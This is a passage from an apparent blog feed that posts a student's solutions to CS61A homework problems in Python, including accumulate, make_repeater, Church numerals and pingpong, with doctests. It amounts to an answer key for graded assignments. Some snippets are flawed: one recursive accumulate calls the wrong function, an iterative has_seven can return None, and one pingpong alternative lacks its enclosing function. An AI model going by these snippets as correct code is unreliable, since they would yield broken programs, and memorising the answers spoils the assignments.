   """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    total, k = base, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> k &lt;= n:</span><br><span class="line">        total, k = combiner(total, term(k)), k + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> total</span><br></pre></td></tr></table></figure>
<p>The following are recursive solution:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">accumulate2</span><span class="params">(combiner, base, n, term)</span>:</span></span><br><span class="line">    <span class="comment"># It seems to be the term n combines accumulate n - 1 terms.</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> base</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> combiner(term(n), accumulate(combiner, base, n - <span class="number">1</span>, term))</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">accumulate3</span><span class="params">(combiner, base, n, term)</span>:</span></span><br><span class="line">    <span class="comment"># This also seems to be the base which is the nth term combines original base accumulate n - 1 terms.</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> base</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> accumulate3(combiner, combiner(base, term(n)), n - <span class="number">1</span>, term)</span><br></pre></td></tr></table></figure>


<p>accumulate has the following parameters:</p>
<ul>
<li>term and n: the same parameters as in summation and product</li>
<li>combiner: a two-argument function that specifies how the current term is combined with the previously accumulated terms.</li>
<li>base: value at which to start the accumulation.</li>
</ul>
<p>For example, the result of accumulate(add, 11, 3, square) is<br>11 + square(1) + square(2) + square(3) = 25<br>You may assume that combiner is associative and commutative.</p>
<p>After implementing accumulate, show how summation and product can both be defined as simple calls to accumulate:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">summation_using_accumulate</span><span class="params">(n, term)</span>:</span></span><br><span class="line">    <span class="string">"""Returns the sum of term(1) + ... + term(n). The implementation</span></span><br><span class="line"><span class="string">    uses accumulate.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; summation_using_accumulate(5, square)</span></span><br><span class="line"><span class="string">    55</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; summation_using_accumulate(5, triple)</span></span><br><span class="line"><span class="string">    45</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; from construct_check import check</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check(HW_SOURCE_FILE, 'summation_using_accumulate',</span></span><br><span class="line"><span class="string">    ...       ['Recursion', 'For', 'While'])</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">return</span> accumulate(add, <span class="number">0</span>, n, term)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">product_using_accumulate</span><span class="params">(n, term)</span>:</span></span><br><span class="line">    <span class="string">"""An implementation of product using accumulate.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; product_using_accumulate(4, square)</span></span><br><span class="line"><span class="string">    576</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; product_using_accumulate(6, triple)</span></span><br><span class="line"><span class="string">    524880</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; from construct_check import check</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check(HW_SOURCE_FILE, 'product_using_accumulate',</span></span><br><span class="line"><span class="string">    ...       ['Recursion', 'For', 'While'])</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">return</span> accumulate(mul, <span class="number">1</span>, n, term)</span><br></pre></td></tr></table></figure>
<h1 id="Q4-Make-Repeater"><a href="#Q4-Make-Repeater" class="headerlink" title="Q4: Make Repeater"></a>Q4: Make Repeater</h1><p>Implement a function make_repeater so that make_repeater(f, n)(x) returns f(f(…f(x)…)), where f is applied n times. That is, make_repeater(f, n) returns another function that can then be applied to another argument. For example, make_repeater(square, 3)(42) evaluates to square(square(square(42))). Yes, it makes sense to apply the function zero times! See if you can figure out a reasonable function to return for that case. You may use either loops or recursion in your implementation.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_repeater</span><span class="params">(f, n)</span>:</span></span><br><span class="line">    <span class="string">"""Return the function that computes the nth application of f.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; add_three = make_repeater(increment, 3)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; add_three(5)</span></span><br><span class="line"><span class="string">    8</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; make_repeater(triple, 5)(1) # 3 * 3 * 3 * 3 * 3 * 1</span></span><br><span class="line"><span class="string">    243</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; make_repeater(square, 2)(5) # square(square(5))</span></span><br><span class="line"><span class="string">    625</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; make_repeater(square, 4)(5) # square(square(square(square(5))))</span></span><br><span class="line"><span class="string">    152587890625</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; make_repeater(square, 0)(5)</span></span><br><span class="line"><span class="string">    5</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">repeat</span><span class="params">(x)</span>:</span></span><br><span class="line">        k = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> k &lt; n:</span><br><span class="line">            x = f(x)</span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    <span class="keyword">return</span> repeat</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_repeater2</span><span class="params">(f, n)</span>:</span></span><br><span class="line">    g = identity</span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        g = compose1(f, g)</span><br><span class="line">        n = n - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> g</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_repeater3</span><span class="params">(f, n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">lambda</span> x: x</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">lambda</span> x: f(make_repeater3(f, n - <span class="number">1</span>)(x))</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_repeater4</span><span class="params">(f, n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">lambda</span> x: x</span><br><span class="line">    <span class="keyword">return</span> compose1(f, make_repeater4(f, n - <span class="number">1</span>))</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_repeater5</span><span class="params">(f, n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> accumulate(compose1, <span class="keyword">lambda</span> x: x, n, <span class="keyword">lambda</span> k: f)</span><br></pre></td></tr></table></figure>

<p>For an extra challenge, try defining make_repeater using compose1 and your accumulate function in a single one-line return statement.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compose1</span><span class="params">(f, g)</span>:</span></span><br><span class="line">    <span class="string">"""Return a function h, such that h(x) = f(g(x))."""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">h</span><span class="params">(x)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> f(g(x))</span><br><span class="line">    <span class="keyword">return</span> h</span><br></pre></td></tr></table></figure>
<h1 id="Q5-Church-numerals"><a href="#Q5-Church-numerals" class="headerlink" title="Q5: Church numerals"></a>Q5: Church numerals</h1><p>The logician Alonzo Church invented a system of representing non-negative integers entirely using functions. The purpose was to show that functions are sufficient to describe all of number theory: if we have functions, we do not need to assume that numbers exist, but instead we can invent them.</p>
<p>Your goal in this problem is to rediscover this representation known as Church numerals. Here are the definitions of zero, as well as a function that returns one more than its argument:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zero</span><span class="params">(f)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">lambda</span> x: x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">successor</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">lambda</span> f: <span class="keyword">lambda</span> x: f(n(f)(x))</span><br></pre></td></tr></table></figure>
<p>First, define functions one and two such that they have the same behavior as successor(zero) and successsor(successor(zero)) respectively, but do not call successor in your implementation.</p>
<p>Next, implement a function church_to_int that converts a church numeral argument to a regular Python integer.</p>
<p>Finally, implement functions add_church, mul_church, and pow_church that perform addition, multiplication, and exponentiation on church numerals.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">one</span><span class="params">(f)</span>:</span></span><br><span class="line">    <span class="string">"""Church numeral 1: same as successor(zero)"""</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">lambda</span> x: f(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">two</span><span class="params">(f)</span>:</span></span><br><span class="line">    <span class="string">"""Church numeral 2: same as successor(successor(zero))"""</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">lambda</span> x: f(f(x))</span><br><span class="line"></span><br><span class="line">three = successor(two)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">church_to_int</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""Convert the Church numeral n to a Python integer.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; church_to_int(zero)</span></span><br><span class="line"><span class="string">    0</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; church_to_int(one)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; church_to_int(two)</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; church_to_int(three)</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> n(<span class="keyword">lambda</span> x: x + <span class="number">1</span>)(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_church</span><span class="params">(m, n)</span>:</span></span><br><span class="line">    <span class="string">"""Return the Church numeral for m + n, for Church numerals m and n.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; church_to_int(add_church(two, three))</span></span><br><span class="line"><span class="string">    5</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">lambda</span> f: <span class="keyword">lambda</span> x: m(f)(n(f)(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul_church</span><span class="params">(m, n)</span>:</span></span><br><span class="line">    <span class="string">"""Return the Church numeral for m * n, for Church numerals m and n.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; four = successor(three)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; church_to_int(mul_church(two, three))</span></span><br><span class="line"><span class="string">    6</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; church_to_int(mul_church(three, four))</span></span><br><span class="line"><span class="string">    12</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">lambda</span> f: m(n(f))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow_church</span><span class="params">(m, n)</span>:</span></span><br><span class="line">    <span class="string">"""Return the Church numeral m ** n, for Church numerals m and n.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; church_to_int(pow_church(two, three))</span></span><br><span class="line"><span class="string">    8</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; church_to_int(pow_church(three, two))</span></span><br><span class="line"><span class="string">    9</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> n(m)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-hw03</title>
    <url>/2018/08/30/cs61a-hw03/</url>
    <content><![CDATA[<h1 id="Q1-Has-Seven"><a href="#Q1-Has-Seven" class="headerlink" title="Q1: Has Seven"></a>Q1: Has Seven</h1><p>Write a recursive function has_seven that takes a positive integer n and returns whether n contains the digit 7. Use recursion - the tests will fail if you use any assignment statements.</p>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">has_seven</span><span class="params">(k)</span>:</span></span><br><span class="line">   <span class="string">"""Returns True if at least one of the digits of k is a 7, False otherwise.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; has_seven(3)</span></span><br><span class="line"><span class="string">   False</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; has_seven(7)</span></span><br><span class="line"><span class="string">   True</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; has_seven(2734)</span></span><br><span class="line"><span class="string">   True</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; has_seven(2634)</span></span><br><span class="line"><span class="string">   False</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; has_seven(734)</span></span><br><span class="line"><span class="string">   True</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; has_seven(7777)</span></span><br><span class="line"><span class="string">   True</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; from construct_check import check</span></span><br><span class="line"><span class="string">   &gt;&gt;&gt; check(HW_SOURCE_FILE, 'has_seven',</span></span><br><span class="line"><span class="string">   ...       ['Assign', 'AugAssign'])</span></span><br><span class="line"><span class="string">   True</span></span><br><span class="line"><span class="string">   """</span></span><br><span class="line">   <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">   <span class="keyword">if</span> k % <span class="number">10</span> == <span class="number">7</span>:</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">   <span class="keyword">elif</span> k == <span class="number">0</span>:</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="keyword">return</span> has_seven(k // <span class="number">10</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># iteration</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">has_seven</span><span class="params">(k)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> k &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> k % <span class="number">10</span> == <span class="number">7</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        k //= <span class="number">10</span></span><br></pre></td></tr></table></figure>

<h1 id="Q2-Ping-pong"><a href="#Q2-Ping-pong" class="headerlink" title="Q2: Ping-pong"></a>Q2: Ping-pong</h1><p>The ping-pong sequence counts up starting from 1 and is always either counting up or counting down. At element k, the direction switches if k is a multiple of 7 or contains the digit 7. The first 30 elements of the ping-pong sequence are listed below, with direction swaps marked using brackets at the 7th, 14th, 17th, 21st, 27th, and 28th elements:</p>
<p>1 2 3 4 5 6 [7] 6 5 4 3 2 1 [0] 1 2 [3] 2 1 0 [-1] 0 1 2 3 4 [5] [4] 5 6<br>Implement a function pingpong that returns the nth element of the ping-pong sequence without using any assignment statements.</p>
<p>You may use the function has_seven from the previous problem.</p>
<p>Hint: If you’re stuck, first try implementing pingpong using assignment statements and a while statement. Then, to convert this into a recursive solution, write a helper function that has a parameter for each variable that changes values in the body of the while loop.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pingpong</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""Return the nth element of the ping-pong sequence.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; pingpong(7)</span></span><br><span class="line"><span class="string">    7</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; pingpong(8)</span></span><br><span class="line"><span class="string">    6</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; pingpong(15)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; pingpong(21)</span></span><br><span class="line"><span class="string">    -1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; pingpong(22)</span></span><br><span class="line"><span class="string">    0</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; pingpong(30)</span></span><br><span class="line"><span class="string">    6</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; pingpong(68)</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; pingpong(69)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; pingpong(70)</span></span><br><span class="line"><span class="string">    0</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; pingpong(71)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; pingpong(72)</span></span><br><span class="line"><span class="string">    0</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; pingpong(100)</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; from construct_check import check</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check(HW_SOURCE_FILE, 'pingpong', ['Assign', 'AugAssign'])</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">return</span> helper(n, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">helper</span><span class="params">(n, i, curr, direction)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> i == n:</span><br><span class="line">        <span class="keyword">return</span> curr</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">7</span> == <span class="number">0</span> <span class="keyword">or</span> has_seven(i):</span><br><span class="line">            <span class="keyword">return</span> helper(n, i + <span class="number">1</span>, curr - direction, -direction)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> helper(n, i + <span class="number">1</span>, curr + direction, direction)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># iteration</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pingpong</span><span class="params">(n)</span>:</span></span><br><span class="line">    i, curr, direction = <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; n:</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">7</span> == <span class="number">0</span> <span class="keyword">or</span> has_seven(i):</span><br><span class="line">            direction = -direction</span><br><span class="line">        curr += direction</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> curr</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Alternate solution 1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pingpong_next</span><span class="params">(x, i, step)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> i == n:</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    <span class="keyword">return</span> pingpong_next(x + step, i + <span class="number">1</span>, next_dir(step, i+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_dir</span><span class="params">(step, i)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">7</span> == <span class="number">0</span> <span class="keyword">or</span> has_seven(i):</span><br><span class="line">        <span class="keyword">return</span> -step</span><br><span class="line">    <span class="keyword">return</span> step</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> pingpong_next(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Alternate solution 2</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pingpong</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line">    <span class="keyword">return</span> direction(n) + pingpong(n<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">direction</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (n<span class="number">-1</span>) % <span class="number">7</span> == <span class="number">0</span> <span class="keyword">or</span> has_seven(n<span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span> * direction(n<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> direction(n<span class="number">-1</span>)</span><br></pre></td></tr></table></figure>
<p>This is a fairly involved recursion problem, which we will first solve through iteration and then convert to a recursive solution.</p>
<p>Note that at any given point in the sequence, we need to keep track of the current value of the sequence (this is the value that might be output) as well as the current index of the sequence (how many items we have seen so far, not actually output).</p>
<p>For example, 14th element has value 0, but it’s the 14th index in the sequence. We will refer to the value as x and the index as i. An iterative solution may look something like this:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pingpong</span><span class="params">(n)</span>:</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; n:</span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure>
<p>Hopefully, it is clear to you that this has a big problem. This doesn’t account for changes in directions at all! It will work for the first seven values of the sequence, but then fail after that. To fix this, we can add in a check for direction, and then also keep track of the current direction to make our lives a bit easier (it’s possible to compute the direction from scratch at each step, see the direction function in the alternate solution).</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pingpong</span><span class="params">(n)</span>:</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    is_up = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; n:</span><br><span class="line">        is_up = next_dir(...)</span><br><span class="line">        <span class="keyword">if</span> is_up:</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x -= <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure>
<p>All that’s left to do is to write the next_dir function, which will take in the current direction and index and then tell us what direction to go in next (which could be the same direction):</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_dir</span><span class="params">(is_up, i)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">7</span> == <span class="number">0</span> <span class="keyword">or</span> has_seven(i):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">not</span> is_up</span><br><span class="line">    <span class="keyword">return</span> is_up</span><br></pre></td></tr></table></figure>
<p>There’s a tiny optimization we can make here. Instead of calculating an increment based on the value of is_up, we can make it directly store the direction of change into the variable (next_dir is also updated, see the solution for the new version):</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pingpong</span><span class="params">(n)</span>:</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    step = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; n:</span><br><span class="line">        step = next_dir(step, i)</span><br><span class="line">        x += step</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure>
<p>This will work, but it uses assignment. To convert it to an equivalent recursive version without assignment, make each local variable into a parameter of a new helper function, and then add an appropriate base case. Lastly, we seed the helper function with appropriate starting values by calling it with the values we had in the iterative version.</p>
<p>You should be able to convince yourself that the version of pingpong in the solutions has the same logic as the iterative version of pingpong above.</p>
<p>Video walkthrough: <a href="https://youtu.be/74gwPjgrN_k" target="_blank" rel="noopener">https://youtu.be/74gwPjgrN_k</a></p>
<p>Several doctests refer to these functions:<br>from operator import add, mul, sub</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">square = <span class="keyword">lambda</span> x: x * x</span><br><span class="line"></span><br><span class="line">identity = <span class="keyword">lambda</span> x: x</span><br><span class="line"></span><br><span class="line">triple = <span class="keyword">lambda</span> x: <span class="number">3</span> * x</span><br><span class="line"></span><br><span class="line">increment = <span class="keyword">lambda</span> x: x + <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h1 id="Q3-Filtered-Accumulate"><a href="#Q3-Filtered-Accumulate" class="headerlink" title="Q3: Filtered Accumulate"></a>Q3: Filtered Accumulate</h1><p>Extend the accumulate function from homework 2 to allow for filtering the results produced by its term argument by filling in the implementation for the filtered_accumulate function:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filtered_accumulate</span><span class="params">(combiner, base, pred, n, term)</span>:</span></span><br><span class="line">    <span class="string">"""Return the result of combining the terms in a sequence of N terms</span></span><br><span class="line"><span class="string">    that satisfy the predicate pred. combiner is a two-argument function.</span></span><br><span class="line"><span class="string">    If v1, v2, ..., vk are the values in term(1), term(2), ..., term(N)</span></span><br><span class="line"><span class="string">    that satisfy pred, then the result is</span></span><br><span class="line"><span class="string">         base combiner v1 combiner v2 ... combiner vk</span></span><br><span class="line"><span class="string">    (treating combiner as if it were a binary operator, like +). The</span></span><br><span class="line"><span class="string">    implementation uses accumulate.</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; filtered_accumulate(add, 0, lambda x: True, 5, identity)  # 0 + 1 + 2 + 3 + 4 + 5</span></span><br><span class="line"><span class="string">    15</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; filtered_accumulate(add, 11, lambda x: False, 5, identity) # 11</span></span><br><span class="line"><span class="string">    11</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; filtered_accumulate(add, 0, odd, 5, identity)   # 0 + 1 + 3 + 5</span></span><br><span class="line"><span class="string">    9</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; filtered_accumulate(mul, 1, greater_than_5, 5, square)  # 1 * 9 * 16 * 25</span></span><br><span class="line"><span class="string">    3600</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; # Do not use while/for loops or recursion</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; from construct_check import check</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check(HW_SOURCE_FILE, 'filtered_accumulate',</span></span><br><span class="line"><span class="string">    ...       ['While', 'For', 'Recursion'])</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">combine_if</span><span class="params">(x, y)</span>:</span></span><br><span class="line">        <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">        <span class="keyword">if</span> pred(y):</span><br><span class="line">            <span class="keyword">return</span> combiner(x, y)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">    <span class="keyword">return</span> accumulate(combine_if, base, n, term)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">odd</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x % <span class="number">2</span> == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greater_than_5</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x &gt; <span class="number">5</span></span><br></pre></td></tr></table></figure>
<p>filtered_accumulate has the following parameters:</p>
